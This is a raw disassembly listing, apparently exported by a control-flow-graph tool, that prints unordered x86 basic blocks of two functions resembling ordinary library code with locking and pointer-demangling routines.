0xb02907f:	jmp	0xb028d61
None
|
|
|
v
0xb028d4d:	sub	ecx, 9
0xb028d50:	cmp	cl, 1
0xb028d53:	jbe	0xb028d61
None
|
|
|
v
0xb028c60:	cmp	byte ptr [eax], 0
0xb028c63:	jne	0xb028f24
None
|
|
|
v
0xb029917:	lea	eax, dword ptr [ebx + 0x1110]
0xb02991d:	call	0xb0f9460
None
|
|
|
v
0xb028c7e:	mov	edi, dword ptr [ebp - 0x48]
0xb028c81:	mov	esi, dword ptr [ebp - 0x4c]
0xb028c84:	lea	eax, dword ptr [esi + esi*2 + 3]
0xb028c88:	lea	esi, dword ptr [eax*4]
0xb028c8f:	mov	eax, dword ptr [ebp - 0x44]
0xb028c92:	mov	dword ptr [esp + 4], esi
0xb028c96:	mov	dword ptr [esp], eax
0xb028c99:	call	0xb0173e0
None
|
|
|
v
0xb028d41:	jmp	0xb028d61
None
|
|
|
v
0xb028af2:	test	eax, eax
0xb028af4:	jne	0xb028ad0
None
|
|
|
v
0xb0288d8:	cmp	dword ptr gs:[0xc], 0
0xb0288e0:	je	0xb0288e3
None
|
|
|
v
0xb028a3c:	mov	eax, dword ptr [ebx - 0x134]
0xb028a42:	mov	edx, dword ptr gs:[0]
0xb028a49:	mov	eax, dword ptr [edx + eax]
0xb028a4c:	mov	eax, dword ptr [eax]
0xb028a4e:	mov	eax, dword ptr [eax + 0x5c]
0xb028a51:	mov	dword ptr [ebp - 0x30], eax
0xb028a54:	jmp	0xb02881f
None
|
|
|
v
0xb028e37:	mov	dword ptr [ebp - 0x50], esi
0xb028e3a:	mov	ecx, dword ptr [ebx - 0xf84]
0xb028e40:	mov	esi, dword ptr [ebp - 0x4c]
0xb028e43:	mov	edx, dword ptr [ecx + edx*4]
0xb028e46:	add	eax, 1
0xb028e49:	add	esi, 1
0xb028e4c:	mov	byte ptr [eax - 1], dl
0xb028e4f:	movsx	edx, byte ptr [esi]
0xb028e52:	test	dl, dl
0xb028e54:	jne	0xb028e43
None
|
|
|
v
0xb028916:	lea	edx, dword ptr [esi + 1]
0xb028919:	cmp	edx, dword ptr [ebp - 0x30]
0xb02891c:	jae	0xb0288f0
None
|
|
|
v
0xb028dc7:	mov	dword ptr [ebp - 0x50], esi
0xb028dca:	mov	esi, dword ptr [ebx - 0xf84]
0xb028dd0:	add	eax, 1
0xb028dd3:	add	ecx, 1
0xb028dd6:	mov	edx, dword ptr [esi + edx*4]
0xb028dd9:	mov	byte ptr [eax - 1], dl
0xb028ddc:	movsx	edx, byte ptr [ecx]
0xb028ddf:	test	dl, dl
0xb028de1:	jne	0xb028dca
None
|
|
|
v
0xb0298e2:	jmp	0xb028a04
None
|
|
|
v
0xb028f8e:	mov	dword ptr [ebp - 0x44], eax
0xb028f91:	jmp	0xb028c84
None
|
|
|
v
0xb028f24:	mov	dword ptr [esp], eax
0xb028f27:	mov	dword ptr [ebp - 0x40], eax
0xb028f2a:	call	0xb07ae80
None
|
|
|
v
0xb028910:	je	0xb0289c0
None
|
|
|
v
0xb028ad0:	sub	edi, 0xc
0xb028ad3:	test	esi, esi
0xb028ad5:	je	0xb028c7e
None
|
|
|
v
0xb028a2b:	mov	esi, dword ptr [ebx + 0x1100]
0xb028a31:	test	esi, esi
0xb028a33:	mov	dword ptr [ebp - 0x30], esi
0xb028a36:	jne	0xb02881f
None
|
|
|
v
0xb0289b0:	call	0xb029d30
None
|
|
|
v
0xb028770:	bswap	eax
0xb028772:	test	eax, eax
0xb028774:	je	0xb0288f0
None
|
|
|
v
0xb028f73:	test	esi, esi
0xb028f75:	mov	byte ptr [eax], 0x2f
0xb028f78:	jne	0xb028f86
None
|
|
|
v
0xb0288a9:	cmp	eax, 0xff
0xb0288ac:	je	0xb028a04
None
|
|
|
v
0xb028aaa:	mov	esi, dword ptr [edi + 0x3c]
0xb028aad:	mov	eax, dword ptr [edi + 0x38]
0xb028ab0:	test	esi, esi
0xb028ab2:	je	0xb028f8e
None
|
|
|
v
0xb028c13:	mov	dword ptr [esp], 0xff0
0xb028c1a:	mov	dword ptr [ebx + 0x1108], 0xff0
0xb028c24:	call	0xb0173f0
None
|
|
|
v
0xb0298c7:	lea	eax, dword ptr [ebx + 0x1110]
0xb0298cd:	call	0xb0f9460
None
|
|
|
v
0xb029902:	jmp	0xb028ef0
None
|
|
|
v
0xb028c6f:	mov	dword ptr [ebx + 0x1104], 1
0xb028c79:	jmp	0xb028a31
None
|
|
|
v
0xb02872d:	bswap	edx
0xb02872f:	add	eax, edx
0xb028731:	mov	dword ptr [esp + 4], eax
0xb028735:	mov	eax, dword ptr [ebp - 0x34]
0xb028738:	mov	dword ptr [ebp - 0x30], ecx
0xb02873b:	mov	dword ptr [esp], eax
0xb02873e:	call	0xb07a740
None
|
|
|
v
0xb028688:	mov	eax, dword ptr [ebp - 0x54]
0xb02868b:	mov	edi, dword ptr [eax + 8]
0xb02868e:	test	edi, edi
0xb028690:	je	0xb0288f0
None
|
|
|
v
0xb028a76:	lea	edx, dword ptr [edi + 0x40]
0xb028a79:	mov	eax, dword ptr [ebx + 0x38a0]
0xb028a7f:	mov	dword ptr [esp], edx
0xb028a82:	ror	eax, 9
0xb028a85:	xor	eax, dword ptr gs:[0x18]
0xb028a8c:	call	eax
None
|
|
|
v
0xb0298d2:	jmp	0xb0288f0
None
|
|
|
v
0xb0288d0:	mov	dword ptr [ebp - 0x30], eax
0xb0288d3:	jmp	0xb028714
None
|
|
|
v
0xb028d0a:	lea	edx, dword ptr [ebx - 0x4a98e]
0xb028d10:	mov	dword ptr [esp + 4], edx
0xb028d14:	mov	dword ptr [esp], eax
0xb028d17:	call	0xb07bcc0
None
|
|
|
v
0xb0290a8:	mov	dword ptr [edi + 8], 0xffffffff
0xb0290af:	jmp	0xb02905a
None
|
|
|
v
0xb02895a:	cmp	esi, dword ptr [ebp - 0x38]
0xb02895d:	jbe	0xb0288f0
None
|
|
|
v
0xb0289a0:	add	eax, dword ptr [edx + 4]
0xb0289a3:	mov	dword ptr [ebp - 0x38], eax
0xb0289a6:	mov	eax, dword ptr [edx]
0xb0289a8:	add	eax, 1
0xb0289ab:	mov	dword ptr [ebp - 0x3c], eax
0xb0289ae:	jmp	0xb02897f
None
|
|
|
v
0xb028a8e:	mov	eax, dword ptr [ebx + 0x38d8]
0xb028a94:	mov	dword ptr [ebp - 0x44], eax
0xb028a97:	jmp	0xb028834
None
|
|
|
v
0xb028da5:	mov	ecx, dword ptr [ebp - 0x30]
0xb028da8:	sub	eax, ecx
0xb028daa:	movsx	edx, byte ptr [ecx]
0xb028dad:	add	eax, 0x29
0xb028db0:	and	eax, 0xfffffff0
0xb028db3:	sub	esp, eax
0xb028db5:	lea	eax, dword ptr [esp + 0x1b]
0xb028db9:	and	eax, 0xfffffff0
0xb028dbc:	test	dl, dl
0xb028dbe:	mov	dword ptr [ebp - 0x48], eax
0xb028dc1:	je	0xb028f9e
None
|
|
|
v
0xb028e59:	cmp	esi, 1
0xb028e5c:	jbe	0xb028f73
None
|
|
|
v
0xb028871:	test	eax, eax
0xb028873:	jne	0xb028850
None
|
|
|
v
0xb0288f2:	lea	esp, dword ptr [ebp - 0xc]
0xb0288f5:	pop	ebx
0xb0288f6:	pop	esi
0xb0288f7:	pop	edi
0xb0288f8:	pop	ebp
0xb0288f9:	ret	8
None
|
|
|
v
0xb028b41:	mov	eax, dword ptr [ebp - 0x38]
0xb028b44:	xor	edi, edi
0xb028b46:	mov	edx, dword ptr [ebx + 0x1108]
0xb028b4c:	mov	dword ptr [ebp - 0x24], eax
0xb028b4f:	mov	eax, dword ptr [ebx + 0x110c]
0xb028b55:	add	eax, 4
0xb028b58:	mov	dword ptr [ebp - 0x20], eax
0xb028b5b:	lea	eax, dword ptr [ebp - 0x24]
0xb028b5e:	mov	dword ptr [ebp - 0x30], eax
0xb028b61:	jmp	0xb028bbd
None
|
|
|
v
0xb028cf6:	sub	esp, 8
0xb028cf9:	cmp	eax, 0xff
0xb028cfc:	je	0xb028a04
None
|
|
|
v
0xb028efb:	mov	dword ptr [ebp - 0x40], 0
0xb028f02:	jmp	0xb02887b
None
|
|
|
v
0xb028f64:	test	esi, esi
0xb028f66:	mov	byte ptr [eax], 0x2f
0xb028f69:	je	0xb028fa6
None
|
|
|
v
0xb028c9e:	test	eax, eax
0xb028ca0:	je	0xb028fc0
None
|
|
|
v
0xb0288c0:	lea	edi, dword ptr [eax + 4]
0xb0288c3:	mov	eax, dword ptr [eax]
0xb0288c5:	mov	dword ptr [ebp - 0x38], edi
0xb0288c8:	mov	dword ptr [ebp - 0x3c], eax
0xb0288cb:	jmp	0xb02898a
None
|
|
|
v
0xb028a9c:	mov	edx, dword ptr [ebx + 0x38d8]
0xb028aa2:	test	edx, edx
0xb028aa4:	jne	0xb028f07
None
|
|
|
v
0xb028d48:	cmp	cl, 0x20
0xb028d4b:	je	0xb028d61
None
|
|
|
v
0xb0298d7:	lea	eax, dword ptr [ebx + 0x1110]
0xb0298dd:	call	0xb0f9460
None
|
|
|
v
0xb02895f:	mov	dword ptr [ebp - 0x30], esi
0xb028962:	jmp	0xb02892c
None
|
|
|
v
0xb028e0e:	movzx	edx, byte ptr [eax]
0xb028e11:	test	dl, dl
0xb028e13:	jne	0xb028e00
None
|
|
|
v
0xb02883f:	mov	eax, dword ptr [edi + 0x38]
0xb028842:	lea	ecx, dword ptr [esi + esi*2]
0xb028845:	mov	dword ptr [ebp - 0x48], edi
0xb028848:	lea	eax, dword ptr [eax + ecx*4 - 0xc]
0xb02884c:	jmp	0xb02885b
None
|
|
|
v
0xb028e7d:	sub	esp, 4
0xb028e80:	test	eax, eax
0xb028e82:	jne	0xb028fed
None
|
|
|
v
0xb0288e2:	lock sub	dword ptr [ebx + 0x1110], 1
None
|
|
|
v
0xb028d55:	add	edx, 1
0xb028d58:	movzx	ecx, byte ptr [eax + edx + 8]
0xb028d5d:	test	cl, cl
0xb028d5f:	jne	0xb028d48
None
|
|
|
v
0xb0289fe:	jne	0xb0298d7
None
|
|
|
v
0xb028c31:	mov	edx, dword ptr [ebx + 0x1140]
0xb028c37:	mov	edi, 1
0xb028c3c:	mov	dword ptr [ebx + 0x1140], eax
0xb028c42:	mov	dword ptr [eax], edx
0xb028c44:	mov	edx, 0xfec
0xb028c49:	jmp	0xb028ba8
None
|
|
|
v
0xb028f3d:	test	eax, eax
0xb028f3f:	mov	esi, eax
0xb028f41:	je	0xb028f59
None
|
|
|
v
0xb028adb:	mov	eax, dword ptr [ebp - 0x30]
0xb028ade:	sub	esi, 1
0xb028ae1:	mov	dword ptr [ebp - 0x40], edi
0xb028ae4:	mov	dword ptr [esp + 4], eax
0xb028ae8:	mov	eax, dword ptr [edi]
0xb028aea:	mov	dword ptr [esp], eax
0xb028aed:	call	0xb07a740
None
|
|
|
v
0xb028850:	test	esi, esi
0xb028852:	lea	eax, dword ptr [edi - 0xc]
0xb028855:	je	0xb028a0e
None
|
|
|
v
0xb028919:	cmp	edx, dword ptr [ebp - 0x30]
0xb02891c:	jae	0xb0288f0
None
|
|
|
v
0xb0298f2:	jmp	0xb028b41
None
|
|
|
v
0xb028bee:	sub	esp, 0xc
0xb028bf1:	test	eax, 0xfffffffb
0xb028bf6:	je	0xb028e9b
None
|
|
|
v
0xb028bfc:	cmp	eax, 5
0xb028bff:	jne	0xb0288d8
None
|
|
|
v
0xb02906c:	jne	0xb029917
None
|
|
|
v
0xb028660:	push	ebp
0xb028661:	mov	ebp, esp
0xb028663:	push	edi
0xb028664:	push	esi
0xb028665:	push	ebx
0xb028666:	sub	esp, 0x5c
0xb028669:	mov	esi, dword ptr [eax + 4]
0xb02866c:	call	0xb1267db
None
|
|
|
v
0xb0287d1:	mov	edx, dword ptr [edi + 0xc]
0xb0287d4:	mov	ecx, dword ptr [ebp - 0x34]
0xb0287d7:	mov	eax, dword ptr [edi]
0xb0287d9:	test	edx, edx
0xb0287db:	mov	edx, dword ptr [edi + 0x1c]
0xb0287de:	lea	edx, dword ptr [edx + ecx*8]
0xb0287e1:	je	0xb0289a0
None
|
|
|
v
0xb028671:	add	ebx, 0x18298f
0xb028677:	mov	dword ptr [ebp - 0x54], eax
0xb02867a:	mov	dword ptr [ebp - 0x58], edx
0xb02867d:	test	esi, esi
0xb02867f:	mov	dword ptr [ebp - 0x34], ecx
0xb028682:	jle	0xb0289b0
None
|
|
|
v
0xb0289c0:	mov	dword ptr [ebp - 0x34], esi
0xb0289c3:	jmp	0xb0287c5
None
|
|
|
v
0xb0286b2:	mov	dword ptr [esp], esi
0xb0286b5:	mov	dword ptr [ebp - 0x3c], eax
0xb0286b8:	call	0xb02ce10
None
|
|
|
v
0xb028bbd:	cmp	edx, 3
0xb028bc0:	jbe	0xb028b68
None
|
|
|
v
0xb028743:	mov	ecx, dword ptr [ebp - 0x30]
0xb028746:	test	eax, eax
0xb028748:	sete	al
0xb02874b:	test	al, al
0xb02874d:	jne	0xb0287c2
None
|
|
|
v
0xb028ffb:	lea	edx, dword ptr [edi + 0x40]
0xb028ffe:	mov	eax, dword ptr [ebx + 0x38a8]
0xb029004:	mov	dword ptr [esp], edx
0xb029007:	ror	eax, 9
0xb02900a:	xor	eax, dword ptr gs:[0x18]
0xb029011:	call	eax
None
|
|
|
v
0xb028cc4:	mov	edx, dword ptr [ebp - 0x40]
0xb028cc7:	lea	eax, dword ptr [edx + esi - 0xc]
0xb028ccb:	mov	edx, dword ptr [ebp - 0x58]
0xb028cce:	mov	dword ptr [eax], ecx
0xb028cd0:	lea	ecx, dword ptr [ebx - 0x4aa73]
0xb028cd6:	mov	dword ptr [eax + 4], 0xffffffff
0xb028cdd:	mov	dword ptr [ebp - 0x40], eax
0xb028ce0:	lea	eax, dword ptr [ebp - 0x1c]
0xb028ce3:	mov	dword ptr [esp + 4], eax
0xb028ce7:	mov	eax, dword ptr [ebp - 0x54]
0xb028cea:	mov	dword ptr [esp], 0
0xb028cf1:	call	0xb028660
None
|
|
|
v
0xb028a59:	lea	edx, dword ptr [edi + 0x40]
0xb028a5c:	mov	eax, dword ptr [ebx + 0x38a8]
0xb028a62:	mov	dword ptr [esp], edx
0xb028a65:	ror	eax, 9
0xb028a68:	xor	eax, dword ptr gs:[0x18]
0xb028a6f:	call	eax
None
|
|
|
v
0xb028f07:	lea	edx, dword ptr [edi + 0x40]
0xb028f0a:	mov	eax, dword ptr [ebx + 0x38a4]
0xb028f10:	mov	dword ptr [esp], edx
0xb028f13:	ror	eax, 9
0xb028f16:	xor	eax, dword ptr gs:[0x18]
0xb028f1d:	call	eax
None
|
|
|
v
0xb028dca:	mov	esi, dword ptr [ebx - 0xf84]
0xb028dd0:	add	eax, 1
0xb028dd3:	add	ecx, 1
0xb028dd6:	mov	edx, dword ptr [esi + edx*4]
0xb028dd9:	mov	byte ptr [eax - 1], dl
0xb028ddc:	movsx	edx, byte ptr [ecx]
0xb028ddf:	test	dl, dl
0xb028de1:	jne	0xb028dca
None
|
|
|
v
0xb0287b1:	mov	ecx, dword ptr [ebp - 0x4c]
0xb0287b4:	test	eax, eax
0xb0287b6:	sete	byte ptr [ebp - 0x30]
0xb0287ba:	movzx	eax, byte ptr [ebp - 0x30]
0xb0287be:	test	al, al
0xb0287c0:	je	0xb02874f
None
|
|
|
v
0xb029025:	mov	eax, dword ptr [ebp - 0x40]
0xb029028:	mov	dword ptr [eax + 4], 0xffffffff
0xb02902f:	jmp	0xb028e88
None
|
|
|
v
0xb028af9:	mov	eax, dword ptr [ebx + 0x38d8]
0xb028aff:	test	eax, eax
0xb028b01:	je	0xb028891
None
|
|
|
v
0xb028bc2:	mov	eax, dword ptr [ebp - 0x40]
0xb028bc5:	lea	esi, dword ptr [ebp - 0x1c]
0xb028bc8:	mov	ecx, dword ptr [ebp - 0x3c]
0xb028bcb:	add	ecx, dword ptr [ebp - 0x24]
0xb028bce:	mov	eax, dword ptr [eax + 4]
0xb028bd1:	mov	dword ptr [esp + 8], esi
0xb028bd5:	mov	esi, dword ptr [ebp - 0x20]
0xb028bd8:	lea	edx, dword ptr [esi + edx - 4]
0xb028bdc:	mov	dword ptr [esp + 4], edx
0xb028be0:	lea	edx, dword ptr [ebp - 0x20]
0xb028be3:	mov	dword ptr [esp], edx
0xb028be6:	mov	edx, dword ptr [ebp - 0x30]
0xb028be9:	call	0xb01b280
None
|
|
|
v
0xb02905a:	cmp	dword ptr gs:[0xc], 0
0xb029062:	je	0xb029065
None
|
|
|
v
0xb0286a7:	mov	esi, dword ptr [ebp - 0x34]
0xb0286aa:	mov	dword ptr [esp], esi
0xb0286ad:	call	0xb07ae80
None
|
|
|
v
0xb028ca6:	mov	dword ptr [edi + 0x38], eax
0xb028ca9:	mov	dword ptr [ebp - 0x40], eax
0xb028cac:	mov	eax, dword ptr [ebp - 0x30]
0xb028caf:	mov	dword ptr [esp], eax
0xb028cb2:	call	0xb07ab00
None
|
|
|
v
0xb028811:	mov	eax, dword ptr [eax + 8]
0xb028814:	test	eax, eax
0xb028816:	mov	dword ptr [ebp - 0x30], eax
0xb028819:	je	0xb028a1d
None
|
|
|
v
0xb028c5c:	test	eax, eax
0xb028c5e:	je	0xb028c69
None
|
|
|
v
0xb028f7a:	mov	byte ptr [eax + 1], 0x2f
0xb028f7e:	add	eax, 2
0xb028f81:	jmp	0xb028e62
None
|
|
|
v
0xb028f6b:	add	eax, 1
0xb028f6e:	jmp	0xb028def
None
|
|
|
v
0xb028f1f:	jmp	0xb028aaa
None
|
|
|
v
0xb028a31:	test	esi, esi
0xb028a33:	mov	dword ptr [ebp - 0x30], esi
0xb028a36:	jne	0xb02881f
None
|
|
|
v
0xb028fed:	add	eax, 1
0xb028ff0:	je	0xb029025
None
|
|
|
v
0xb028c69:	mov	esi, dword ptr [ebx + 0x1100]
0xb028c6f:	mov	dword ptr [ebx + 0x1104], 1
0xb028c79:	jmp	0xb028a31
None
|
|
|
v
0xb028714:	mov	edx, dword ptr [ebp - 0x3c]
0xb028717:	xor	eax, eax
0xb028719:	cmp	dword ptr [ebp - 0x30], edx
0xb02871c:	jb	0xb02874b
None
|
|
|
v
0xb0289f6:	lock sub	dword ptr [ebx + 0x1110], 1
None
|
|
|
v
0xb028772:	test	eax, eax
0xb028774:	je	0xb0288f0
None
|
|
|
v
0xb028891:	mov	eax, dword ptr [ebp - 0x40]
0xb028894:	cmp	dword ptr [eax + 4], -1
0xb028898:	je	0xb02898a
None
|
|
|
v
0xb029043:	lock cmpxchg	dword ptr [ebx + 0x1110], ecx
0xb02904b:	jne	0xb029907
None
|
|
|
v
0xb028d34:	sub	edx, 9
0xb028d37:	cmp	dl, 1
0xb028d3a:	mov	edx, 0
0xb028d3f:	ja	0xb028d55
None
|
|
|
v
0xb028de6:	cmp	esi, 1
0xb028de9:	jbe	0xb028f64
None
|
|
|
v
0xb028c29:	test	eax, eax
0xb028c2b:	je	0xb0289d8
None
|
|
|
v
0xb02871e:	mov	edx, dword ptr [ebp - 0x50]
0xb028721:	cmp	dword ptr [ebp - 0x4c], 0
0xb028725:	mov	eax, dword ptr [edi]
0xb028727:	mov	edx, dword ptr [edx + ecx*8 + 4]
0xb02872b:	je	0xb02872f
None
|
|
|
v
0xb028f86:	add	eax, 1
0xb028f89:	jmp	0xb028e62
None
|
|
|
v
0xb028ee2:	lock sub	dword ptr [ebx + 0x1110], 1
None
|
|
|
v
0xb028b94:	mov	edx, dword ptr [ebp - 0x2c]
0xb028b97:	test	eax, eax
0xb028b99:	je	0xb0289c8
None
|
|
|
v
0xb028ba8:	lea	ecx, dword ptr [eax + 4]
0xb028bab:	add	eax, 8
0xb028bae:	mov	dword ptr [ebx + 0x110c], ecx
0xb028bb4:	mov	dword ptr [ebx + 0x1108], edx
0xb028bba:	mov	dword ptr [ebp - 0x20], eax
0xb028bbd:	cmp	edx, 3
0xb028bc0:	jbe	0xb028b68
None
|
|
|
v
0xb02889e:	mov	eax, dword ptr [eax + 8]
0xb0288a1:	test	eax, eax
0xb0288a3:	je	0xb029034
None
|
|
|
v
0xb028c84:	lea	eax, dword ptr [esi + esi*2 + 3]
0xb028c88:	lea	esi, dword ptr [eax*4]
0xb028c8f:	mov	eax, dword ptr [ebp - 0x44]
0xb028c92:	mov	dword ptr [esp + 4], esi
0xb028c96:	mov	dword ptr [esp], eax
0xb028c99:	call	0xb0173e0
None
|
|
|
v
0xb02887b:	mov	esi, dword ptr [ebp - 0x44]
0xb02887e:	test	esi, esi
0xb028880:	jne	0xb028a59
None
|
|
|
v
0xb028c4e:	lea	eax, dword ptr [ebx - 0x4a99d]
0xb028c54:	mov	dword ptr [esp], eax
0xb028c57:	call	0xb032860
None
|
|
|
v
0xb02891e:	mov	eax, dword ptr [edi]
0xb028920:	mov	dword ptr [ebp - 0x38], edx
0xb028923:	mov	dword ptr [ebp - 0x3c], eax
0xb028926:	mov	eax, dword ptr [edi + 0xc]
0xb028929:	mov	dword ptr [ebp - 0x40], eax
0xb02892c:	mov	esi, dword ptr [ebp - 0x30]
0xb02892f:	mov	ecx, dword ptr [ebp - 0x40]
0xb028932:	add	esi, dword ptr [ebp - 0x38]
0xb028935:	mov	eax, dword ptr [edi + 0x18]
0xb028938:	shr	esi, 1
0xb02893a:	test	ecx, ecx
0xb02893c:	mov	eax, dword ptr [eax + esi*8 + 4]
0xb028940:	je	0xb028944
None
|
|
|
v
0xb0289c8:	mov	eax, dword ptr [edx]
0xb0289ca:	mov	dword ptr [esp], edx
0xb0289cd:	mov	dword ptr [ebx + 0x1140], eax
0xb0289d3:	call	0xb017470
None
|
|
|
v
0xb02901e:	xor	eax, eax
0xb029020:	jmp	0xb0288f2
None
|
|
|
v
0xb029912:	jmp	0xb029051
None
|
|
|
v
0xb028fe5:	or	eax, 0xffffffff
0xb028fe8:	jmp	0xb0288f2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0290c0
TOTAL BLOCKS :129
0xb0296f5:	mov	ecx, dword ptr [edx + 0x14]
0xb0296f8:	mov	eax, dword ptr [edx + 0x10]
0xb0296fb:	mov	edx, dword ptr [edx + 0x18]
0xb0296fe:	mov	dword ptr [esp], edx
0xb029701:	mov	edx, dword ptr [ebp + 0x18]
0xb029704:	call	0xb028570
None
|
|
|
v
0xb02943d:	mov	ecx, dword ptr [ebp + 0xc]
0xb029440:	lea	eax, dword ptr [ebp - 0x3c]
0xb029443:	mov	edx, esi
0xb029445:	mov	dword ptr [ebp - 0x58], eax
0xb029448:	mov	dword ptr [esp + 4], eax
0xb02944c:	mov	eax, edi
0xb02944e:	mov	dword ptr [esp], 1
0xb029455:	call	0xb028660
None
|
|
|
v
0xb02947b:	mov	esi, dword ptr [ebp - 0x64]
0xb02947e:	mov	edx, dword ptr [ebx - 0x94]
0xb029484:	mov	eax, dword ptr [esi]
0xb029486:	mov	edx, dword ptr [edx]
0xb029488:	mov	dword ptr [eax + 0x10], edi
0xb02948b:	mov	dword ptr [eax + 0xc], edx
0xb02948e:	mov	eax, dword ptr [esi]
0xb029490:	mov	edx, dword ptr [ebp - 0x3c]
0xb029493:	mov	dword ptr [eax + 0x14], ecx
0xb029496:	mov	eax, dword ptr [esi]
0xb029498:	mov	dword ptr [eax + 0x18], edx
0xb02949b:	mov	esi, dword ptr [ebx - 0xdc]
0xb0294a1:	mov	eax, dword ptr [ebp - 0x68]
0xb0294a4:	mov	edx, dword ptr [ebp - 0x6c]
0xb0294a7:	mov	dword ptr [eax + esi], edx
0xb0294aa:	mov	esi, dword ptr [ebp + 0x14]
0xb0294ad:	test	esi, esi
0xb0294af:	jne	0xb02970e
None
|
|
|
v
0xb0293f8:	mov	eax, dword ptr [ebp - 0x4c]
0xb0293fb:	movzx	eax, byte ptr [eax]
0xb0293fe:	cmp	al, 0x43
0xb029400:	je	0xb029512
None
|
|
|
v
0xb029860:	mov	eax, dword ptr [ebp - 0x4c]
0xb029863:	cmp	eax, dword ptr [esi]
0xb029865:	je	0xb02949b
None
|
|
|
v
0xb029416:	je	0xb02951f
None
|
|
|
v
0xb0293ae:	mov	edx, dword ptr [ebp - 0x4c]
0xb0293b1:	mov	ecx, dword ptr [ebp - 0x50]
0xb0293b4:	jmp	0xb0293bc
None
|
|
|
v
0xb029549:	mov	esi, dword ptr [ebp + 0x10]
0xb02954c:	lea	esp, dword ptr [ebp - 0xc]
0xb02954f:	mov	eax, esi
0xb029551:	pop	ebx
0xb029552:	pop	esi
0xb029553:	pop	edi
0xb029554:	pop	ebp
0xb029555:	ret	
None
|
|
|
v
0xb02979d:	mov	edx, dword ptr [ebp + 0xc]
0xb0297a0:	add	eax, 0x1c
0xb0297a3:	add	esi, 1
0xb0297a6:	mov	dword ptr [ebp - 0x58], ecx
0xb0297a9:	mov	ecx, dword ptr [ebp - 0x50]
0xb0297ac:	mov	dword ptr [esp], eax
0xb0297af:	mov	dword ptr [esp + 4], edx
0xb0297b3:	mov	dword ptr [esp + 8], ecx
0xb0297b7:	call	0xb07cad0
None
|
|
|
v
0xb029101:	mov	eax, dword ptr [ebp + 8]
0xb029104:	mov	dword ptr [ebp - 0x28], 0
0xb02910b:	test	eax, eax
0xb02910d:	mov	eax, dword ptr [ebp + 8]
0xb029110:	cmove	eax, dword ptr [ebx + 0x92c]
0xb029117:	mov	dword ptr [ebp + 8], eax
0xb02911a:	mov	eax, dword ptr [ebp + 0xc]
0xb02911d:	mov	dword ptr [ebp - 0x1c], eax
0xb029120:	mov	eax, dword ptr [ebp + 8]
0xb029123:	mov	dword ptr [ebp - 0x38], eax
0xb029126:	mov	eax, dword ptr [ebp + 0x1c]
0xb029129:	mov	dword ptr [esp], eax
0xb02912c:	mov	dword ptr [ebp - 0x34], eax
0xb02912f:	call	0xb027640
None
|
|
|
v
0xb0294b5:	mov	edx, dword ptr [ebx + 0x38d8]
0xb0294bb:	mov	esi, ecx
0xb0294bd:	test	edx, edx
0xb0294bf:	je	0xb02954c
None
|
|
|
v
0xb0294c5:	lea	edx, dword ptr [ebx + 0xfe0]
0xb0294cb:	mov	eax, dword ptr [ebx + 0x38a8]
0xb0294d1:	mov	dword ptr [esp], edx
0xb0294d4:	ror	eax, 9
0xb0294d7:	xor	eax, dword ptr gs:[0x18]
0xb0294de:	call	eax
None
|
|
|
v
0xb029208:	lea	eax, dword ptr [esi + 0xc]
0xb02920b:	mov	dword ptr [esp + 4], eax
0xb02920f:	mov	dword ptr [esp], edi
0xb029212:	call	0xb07a740
None
|
|
|
v
0xb0295d6:	mov	dword ptr [ebp - 0x50], eax
0xb0295d9:	jmp	0xb02931a
None
|
|
|
v
0xb0296f0:	jmp	0xb02952d
None
|
|
|
v
0xb029831:	mov	eax, dword ptr [ebp - 0x74]
0xb029834:	mov	dword ptr [ebp - 0x50], ecx
0xb029837:	mov	dword ptr [esp + 8], eax
0xb02983b:	mov	eax, dword ptr [ebp - 0x78]
0xb02983e:	mov	dword ptr [esp + 4], eax
0xb029842:	mov	eax, dword ptr [ebp - 0x4c]
0xb029845:	mov	dword ptr [esp], eax
0xb029848:	call	0xb0e7d80
None
|
|
|
v
0xb029380:	add	eax, 0x1f
0xb029383:	and	eax, 0xfffffff0
0xb029386:	sub	esp, eax
0xb029388:	lea	eax, dword ptr [esp + 0x1b]
0xb02938c:	and	eax, 0xfffffff0
0xb02938f:	mov	dword ptr [ebp - 0x4c], eax
0xb029392:	lea	esi, dword ptr [esi]
0xb029398:	mov	eax, dword ptr [ebp - 0x50]
0xb02939b:	movzx	eax, byte ptr [eax]
0xb02939e:	cmp	al, 0x3a
0xb0293a0:	je	0xb029568
None
|
|
|
v
0xb02945a:	sub	esp, 8
0xb02945d:	test	eax, eax
0xb02945f:	je	0xb029578
None
|
|
|
v
0xb0297f7:	mov	eax, dword ptr [ebp - 0x4c]
0xb0297fa:	mov	edx, dword ptr [ebp - 0x50]
0xb0297fd:	mov	esi, dword ptr [ebp + 0x1c]
0xb029800:	mov	ecx, dword ptr [ebp - 0x58]
0xb029803:	mov	dword ptr [eax], edx
0xb029805:	mov	edx, dword ptr [ebp - 0x54]
0xb029808:	mov	dword ptr [eax + 4], esi
0xb02980b:	mov	esi, eax
0xb02980d:	mov	dword ptr [eax + 8], edx
0xb029810:	mov	eax, dword ptr [ebx - 0x94]
0xb029816:	mov	dword ptr [esi + 0x10], edi
0xb029819:	mov	dword ptr [esi + 0x14], ecx
0xb02981c:	mov	eax, dword ptr [eax]
0xb02981e:	mov	dword ptr [esi + 0xc], eax
0xb029821:	mov	eax, dword ptr [ebp - 0x3c]
0xb029824:	mov	dword ptr [esi + 0x18], eax
0xb029827:	mov	eax, dword ptr [ebx + 0x38d8]
0xb02982d:	test	eax, eax
0xb02982f:	jne	0xb0298a1
None
|
|
|
v
0xb029667:	mov	dword ptr [ebp - 0x54], esi
0xb02966a:	lea	eax, dword ptr [ebx - 0x4a97c]
0xb029670:	mov	dword ptr [ebp - 0x5c], eax
0xb029673:	jmp	0xb0292c7
None
|
|
|
v
0xb02970e:	mov	eax, dword ptr [ebp - 0x3c]
0xb029711:	mov	edx, dword ptr [ebp + 0x18]
0xb029714:	mov	dword ptr [esp], eax
0xb029717:	mov	eax, edi
0xb029719:	call	0xb028570
None
|
|
|
v
0xb029199:	mov	dword ptr [ebp - 0x64], eax
0xb02919c:	mov	eax, dword ptr [ebx + 0x38d8]
0xb0291a2:	test	eax, eax
0xb0291a4:	jne	0xb0295de
None
|
|
|
v
0xb029160:	mov	dword ptr [ebp - 0x70], eax
0xb029163:	mov	dword ptr [ebp - 0x30], eax
0xb029166:	mov	eax, dword ptr [ebx + 0x38d8]
0xb02916c:	test	eax, eax
0xb02916e:	jne	0xb0295fe
None
|
|
|
v
0xb0295f9:	jmp	0xb0291aa
None
|
|
|
v
